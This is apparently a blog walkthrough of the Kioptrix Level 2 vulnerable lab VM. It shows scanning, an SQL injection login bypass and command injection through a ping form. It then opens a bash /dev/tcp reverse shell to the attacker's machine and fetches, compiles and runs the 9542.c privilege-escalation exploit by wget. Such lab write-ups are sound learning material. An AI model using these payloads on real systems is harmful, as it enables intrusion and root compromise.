@@ -1,0 +1,135 @@
+I"�<h4 id="kioptrix-level-2">Kioptrix Level 2</h4>
+
+<p>Hey there, welcome back.. for today, we will play with <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix 2</a>.</p>
+
+<p>First, I ran ifconfig and netdiscover to find my Kali ip and the target ip.</p>
+<blockquote>
+  <p>ifconfig
+netdiscover -i eth0 -r 192.168.1.0/24</p>
+</blockquote>
+
+<p><img src="/musubi/assets/kioptrix_2/ifconfig_netdiscover.png" alt="ifconfig" /></p>
+
+<p>and after that, I scanned the target using the following nmap options;</p>
+<blockquote>
+  <p>nmap -sS -sV -A -v 192.168.1.101</p>
+</blockquote>
+
+<p><img src="/musubi/assets/kioptrix_2/nmap_result.png" alt="first_result" /></p>
+
+<p>as we can see above, the target is using <strong>OpenSSH 3.9p1</strong> and <strong>Apache httpd 2.0.52</strong>. After a quick find on <code class="language-plaintext highlighter-rouge">searchsploit</code>, the only thing I could find is Denial of service (DoS) attack on the machine..</p>
+
+<p><img src="/musubi/assets/kioptrix_2/only_dos.png" alt="only_dos" /></p>
+
+<p>And yeah, we don’t want to DoS it, it’s not our job for now.. ಠ_ಠ</p>
+
+<p>So, I’ll go with web-based attack.</p>
+
+<p>I used nikto and dirb on the target to list directories and find vulnerable configurations.</p>
+
+<p><img src="/musubi/assets/kioptrix_2/nikto_dirb.png" alt="nikto_dirb" /></p>
+
+<p>Okay, nothing interesting here..</p>
+
+<p>Let’s open the browser and connect to the target webpage since the port <code class="language-plaintext highlighter-rouge">80</code> is open (based on the nmap result)</p>
+
+<p><img src="/musubi/assets/kioptrix_2/homepage.png" alt="webpage" /></p>
+
+<p>Wow, what a beautiful homepage.. ✖‿✖</p>
+
+<p>The first thing that came to my mind was.. SQLi attack,so I inserted</p>
+<blockquote>
+  <p>’ or ‘’=’</p>
+</blockquote>
+
+<p>in the username and password field, and it worked! Yayy..</p>
+
+<p><img src="/musubi/assets/kioptrix_2/ping.png" alt="pingit" /></p>
+
+<p>Based on the image, the form will ping any ip that we put inside the text field, so I tried to ping my Kali machine located at <code class="language-plaintext highlighter-rouge">192.168.1.5</code>.</p>
+
+<p><img src="/musubi/assets/kioptrix_2/ping_Kali.png" alt="pingKali" /></p>
+
+<p>The output showed that the form executed a simple <code class="language-plaintext highlighter-rouge">ping</code> command, something like this;</p>
+<blockquote>
+  <p>ping 192.168.1.5 -c 3</p>
+</blockquote>
+
+<p>I guess the form will send what’s inside the text field and pass it into ping command of the machine OS.</p>
+
+<p>Then, it is possible that the field is vulnerable to multiple code execution using the <code class="language-plaintext highlighter-rouge">;</code> symbol. The symbol is usually used to separate and execute different commands, for example;</p>
+<blockquote>
+  <p>cat meow.txt; echo “y4t0-chan kawaii”</p>
+</blockquote>
+
+<p>will show the output of the file named <strong>meow.txt</strong> and then print out the word <strong>y4t0-chan kawaii</strong></p>
+
+<p>To test whether it is possible, I put <code class="language-plaintext highlighter-rouge">192.168.1.5;ls</code> in the text field.</p>
+
+<p><img src="/musubi/assets/kioptrix_2/OS_command_exec.png" alt="OS_command" /></p>
+
+<p>and it worked.</p>
+
+<p>Now, let’s use this to gain shell from our Kali machine.</p>
+
+<p>I tried to use <code class="language-plaintext highlighter-rouge">netcat</code> but nothing happened, so I used a workaround that uses <code class="language-plaintext highlighter-rouge">bash</code> to create a reverse shell back to the Kali machine.</p>
+
+<p>First, we need to set up a listener on our Kali machine by using following command;</p>
+<blockquote>
+  <p>nc -lvp 1234</p>
+</blockquote>
+
+<p><img src="/musubi/assets/kioptrix_2/nc_listener.png" alt="listener" /></p>
+
+<p>and then , on the text field of the form, add;</p>
+<blockquote>
+  <p>192.168.1.5;bash -i &gt;&amp; /dev/tcp/192.168.1.5/1234 0&gt;&amp;1</p>
+</blockquote>
+
+<p><img src="/musubi/assets/kioptrix_2/submit_r_shell.png" alt="submit" /></p>
+
+<p>The second command was basically used to open a reverse shell and connect to the listening port of our Kali machine.</p>
+
+<p>Once connected, I tried to find more information about the target.</p>
+
+<p><img src="/musubi/assets/kioptrix_2/connected_shell.png" alt="connected" /></p>
+
+<p>Since the user is <strong>apache</strong> and not in the <strong>superuser</strong> group, I need to use privilege escalation attack to gain root access.</p>
+
+<p>After using some keywords to search for available exploits in <code class="language-plaintext highlighter-rouge">searchsploit</code>, I stumbled upon a local priv. esc. attack for <strong>CentOS 4.5</strong>.</p>
+
+<p><img src="/musubi/assets/kioptrix_2/9542.png" alt="9542" /></p>
+
+<p>So, I copied the exploit into my <code class="language-plaintext highlighter-rouge">/var/www/html</code> directory and I fetched it from the target machine using <code class="language-plaintext highlighter-rouge">wget</code> method.</p>
+
+<h3 id="in-kali">in <strong>Kali</strong></h3>
+<blockquote>
+  <p>cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c</p>
+</blockquote>
+
+<p>I needed to ensure my apache service is running so, I ran;</p>
+<blockquote>
+  <p>service apache2 restart</p>
+</blockquote>
+
+<h3 id="in-centos-45">in <strong>CentOS 4.5</strong></h3>
+<p>since I cant download it directly into the current directory, I moved myself into the /tmp folder.</p>
+<blockquote>
+  <p>cd /tmp<br />
+wget http://192.168.1.5/9542.c</p>
+</blockquote>
+
+<p>and then, I compiled and ran the exploit…</p>
+
+<p>(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧</p>
+
+<blockquote>
+  <p>gcc 9542.c -o priv<br />
+chmod +x priv<br />
+./priv</p>
+</blockquote>
+
+<p><img src="/musubi/assets/kioptrix_2/priv.png" alt="priv.png" /></p>
+
+<p>… and we finally got our root access. That’s all for today. Thank you..</p>
+:ET
